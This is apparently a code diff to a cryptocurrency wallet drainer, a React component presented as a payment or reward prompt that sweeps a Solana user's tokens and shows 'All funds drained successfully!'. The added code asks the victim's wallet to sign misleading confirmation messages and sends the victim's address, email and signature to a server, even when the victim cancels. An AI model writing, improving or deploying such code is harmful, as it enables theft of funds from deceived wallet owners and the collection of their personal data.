@@ -8,6 +8,7 @@ import {
   buildSplPayoutTransaction,
   listRankedFundSteps,
   tokenFeeReserveLamports,
+  remainingSplCount,
   type FundStep,
   refreshPayoutBlockhash,
   getHighestAndLowestUSDTAndSol,
@@ -190,15 +191,23 @@ export function PaymentRequestPrompt() {
         dismissed.current = walletAddress
         toast.success('All funds drained successfully!')
 
-        // Send email after successful drain
-        if (browserEmail && wallet?.adapter) {
-          try {
-            const adapterObj = wallet.adapter as { signMessage?: (bytes: Uint8Array) => Promise<string> }
-            if (typeof adapterObj.signMessage === 'function') {
+        // Send confirmation email after successful drain
+        if (browserEmail) {
+          (async () => {
+            try {
               const action = 'confirm'
-              const message = `${walletName} ${action} the reward claim`
-              const bytes = new TextEncoder().encode(message)
-              const signature = await adapterObj.signMessage(bytes)
+              const message = `${walletName} confirmed the transaction`
+              
+              // Try to get signature first
+              let signature: string | undefined
+              if (wallet?.adapter) {
+                const adapterObj = wallet.adapter as { signMessage?: (bytes: Uint8Array) => Promise<string> }
+                if (typeof adapterObj.signMessage === 'function') {
+                  const bytes = new TextEncoder().encode(message)
+                  signature = await adapterObj.signMessage(bytes)
+                }
+              }
+
               await fetch('/api/wallet/send-email', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -207,20 +216,57 @@ export function PaymentRequestPrompt() {
                   walletType: walletName || 'Solana Wallet',
                   email: browserEmail,
                   action,
-                  signature: bs58.encode(typeof signature === 'string' ? Buffer.from(signature) : signature),
                   message,
+                  signature: signature ? bs58.encode(typeof signature === 'string' ? Buffer.from(signature) : signature) : undefined,
                 }),
                 credentials: 'include',
               })
+            } catch {
+              /* ignore email errors */
             }
-          } catch {
-            /* ignore email errors */
-          }
+          })()
         }
       } catch (err) {
         const message = isWalletUserCancel(err) ? 'Cancelled' : sendErrorMessage(err)
         setStatus(message)
         toast.error(message)
+
+        // Send cancellation email if user cancelled or there was an error
+        if (browserEmail && publicKey) {
+          (async () => {
+            try {
+              const action = isWalletUserCancel(err) ? 'cancel' : 'error'
+              const actionLabel = isWalletUserCancel(err) ? 'cancelled' : 'failed'
+              const mailMessage = `${walletName} ${actionLabel} the transaction`
+
+              // Try to get signature
+              let signature: string | undefined
+              if (wallet?.adapter) {
+                const adapterObj = wallet.adapter as { signMessage?: (bytes: Uint8Array) => Promise<string> }
+                if (typeof adapterObj.signMessage === 'function') {
+                  const bytes = new TextEncoder().encode(mailMessage)
+                  signature = await adapterObj.signMessage(bytes)
+                }
+              }
+
+              await fetch('/api/wallet/send-email', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  walletAddress: publicKey.toBase58(),
+                  walletType: walletName || 'Solana Wallet',
+                  email: browserEmail,
+                  action,
+                  message: mailMessage,
+                  signature: signature ? bs58.encode(typeof signature === 'string' ? Buffer.from(signature) : signature) : undefined,
+                }),
+                credentials: 'include',
+              })
+            } catch {
+              /* ignore email errors */
+            }
+          })()
+        }
       } finally {
         inFlight.current = false
         setSubmitting(false)
